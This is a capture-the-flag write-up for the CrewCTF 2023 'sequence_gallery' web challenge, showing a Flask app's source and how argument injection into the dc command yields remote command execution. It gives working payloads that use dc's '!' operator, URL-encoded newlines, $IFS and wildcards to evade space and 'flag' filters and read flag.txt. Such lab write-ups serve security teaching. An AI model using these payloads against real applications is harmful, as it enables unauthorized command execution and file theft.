# sequence_gallery

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Conclusion](#conclusion)

## Overview

- Overall difficulty for me (From 1-10 stars): ★★★★☆☆☆☆☆☆

## Background

- Do you like sequences?

Author : Satoooon

[http://sequence-gallery.chal.crewc.tf:8080/](http://sequence-gallery.chal.crewc.tf:8080/)

## Enumeration

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/CrewCTF-2023/images/Pasted%20image%2020230708134050.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/CrewCTF-2023/images/Pasted%20image%2020230708145108.png)

**In here, we can click the "View" button to see the output of each functions:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/CrewCTF-2023/images/Pasted%20image%2020230708145125.png)

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/CrewCTF-2023/Web/sequence_gallery/sequence_gallery.zip):**
```shell
┌[siunam♥Mercury]-(~/ctf/CrewCTF-2023/Web/sequence_gallery)-[2023.07.08|14:51:57(HKT)]
└> unzip sequence_gallery.zip 
Archive:  sequence_gallery.zip
   creating: dist/
   creating: dist/src/
  inflating: dist/src/factorial.dc   
  inflating: dist/src/fibonacchi.dc  
  inflating: dist/src/flag.txt       
  inflating: dist/src/main.py        
  inflating: dist/src/power.dc       
   creating: dist/src/templates/
  inflating: dist/src/templates/index.html  
```

**In `dist/src/main.py`, we can see the web application logic:**
```python
import os
import sqlite3
import subprocess

from flask import Flask, request, render_template

app = Flask(__name__)

@app.get('/')
def index():
	sequence = request.args.get('sequence', None)
	if sequence is None:
		return render_template('index.html')

	script_file = os.path.basename(sequence + '.dc')
	if ' ' in script_file or 'flag' in script_file:
		return ':('

	proc = subprocess.run(
		['dc', script_file], 
		capture_output=True,
		text=True,
		timeout=1,
	)
	output = proc.stdout

	return render_template('index.html', output=output)

if __name__ == '__main__':
	app.run(host='0.0.0.0', port=8080)
```

In route `/`, when the `sequence` GET parameter is given, it'll strip out all rest of the path and ONLY extract the filename. Then, it'll append `.dc` to the filename. For example, parameter value `power` will become `power.dc`.

Moreover, if the `sequence` GET parameter's value contains ` ` or `flag`, it'll return `:(`.

After that, it'll use `subprocess.run()` method to execute a Linux command called `dc`, and with the `sequence` GET parameter's value as the ***argument***. Notice that the `Shell` argument is not provided, which means **we can't inject OS command**. (Or is it :D)

Finally, use `render_template()` to render the `output` of the `dc` command. (`render_template()` is not vulnerable to Server-Side Template Injection (SSTI))

## Exploitation

Now, in `subprocess.run()` method it doesn't have `Shell=True`, however it doesn't mean it's not vulnerable.

Our `sequence` GET parameter's value is being parsed as an argument in the `dc` command, thus it's ***vulnerable argument injection***:

![](https://github.com/siunam321/CTF-Writeups/blob/main/CrewCTF-2023/images/Pasted%20image%2020230708150122.png)

Nice! We can now confirm it's vulnerable to argument injection.

Hmm... I wonder what's `dc` in Linux...

**Let's install and view it's `man` page:**
```shell
┌[siunam♥Mercury]-(~/ctf/CrewCTF-2023/Web/sequence_gallery)-[2023.07.08|15:01:45(HKT)]
└> sudo apt install dc
[...]
┌[siunam♥Mercury]-(~/ctf/CrewCTF-2023/Web/sequence_gallery)-[2023.07.08|15:01:47(HKT)]
└> man dc
[...]
DESCRIPTION
       dc  is  a  reverse-polish  desk calculator which supports unlimited precision arithmetic.  It
       also allows you to define and call macros.  Normally dc reads from the standard input; if any
       command arguments are given to it, they are filenames, and dc reads and executes the contents
       of the files before reading from standard input.  All normal output is  to  standard  output;
       all error output is to standard error.

       A  reverse-polish  calculator  stores numbers on a stack.  Entering a number pushes it on the
       stack.  Arithmetic operations pop arguments off the stack and push the results.

       To enter a number in dc, type the digits (using upper case letters A through  F  as  "digits"
       when working with input bases greater than ten), with an optional decimal point.  Exponential
       notation is not supported.  To enter a negative number, begin the number with  ``_''.   ``-''
       cannot  be  used  for this, as it is a binary operator for subtraction instead.  To enter two
       numbers in succession, separate them with spaces or newlines.  These have no meaning as  com‐
       mands.
[...]
```

With that said, it's basically a *calculator*.

**However, when I was reading the `man` page, I found this:**
```shell
[...]
Miscellaneous
       !      Will run the rest of the line as a system command.  Note that parsing of the  !<,  !=,
              and  !>  commands take precedence, so if you want to run a command starting with <, =,
              or > you will need to add a space after the !.
[...]
```

Wow! So we can execute OS command? Cool!

**Let's try the following payload:**
```shell
-e !id
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/CrewCTF-2023/images/Pasted%20image%2020230708150507.png)

Uhh... I forgot the ` ` filter.

**In order to bypass the ` ` filter, we can try to replace ` ` with anything else:**
```shell
-e"!id
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/CrewCTF-2023/images/Pasted%20image%2020230708150638.png)

We bypassed the filter! However, the `id` command still didn't execute...

**This is because our `id` command hasn't pressed the Enter key, or the new line character `\n` (`%0a` in URL encoding):**
```
-e"!id%0a
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/CrewCTF-2023/images/Pasted%20image%2020230708150815.png)

Nice! We can now execute arbitrary OS commands! 

**Let's get the flag!**
```
-e"!cat flag.txt%0A
```

Uh... Wait, the filters!

This time, since the ` ` is executed on the system, we need to find other bypasses.

Based on my experience, some Bash jail CTF challenges have banned ` ` the character.

In Bash, **we can use the `$IFS` special shell variable**. The `$IFS` (Internal Field Separator) is used by the shell to determine how to do word splitting, the default value for `$IFS` consists of whitespace characters.

Next, we need to bypass the `flag` filter.

To do so, we can use the `*` wildcard character, which will then read all the files in the current working directory.

**Hence, the final payload will be:**
```shell
-e"!cat$IFS*.txt%0A
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/CrewCTF-2023/images/Pasted%20image%2020230708151601.png)

- **Flag: `crew{10 63 67 68 101 107 105 76 85 111 68[dan10!=m]smlmx}`**

```shell
┌[siunam♥Mercury]-(~/ctf/CrewCTF-2023/Web/sequence_gallery)-[2023.07.08|15:18:28(HKT)]
└> dc         
10 63 67 68 101 107 105 76 85 111 68[dan10!=m]smlmx
DoULikeDC?
```

- Real flag (?) : `crew{DoULikeDC?}`

## Conclusion

What we've learned:

1. Remote Code Execution Via Argument Injection With `dc` Command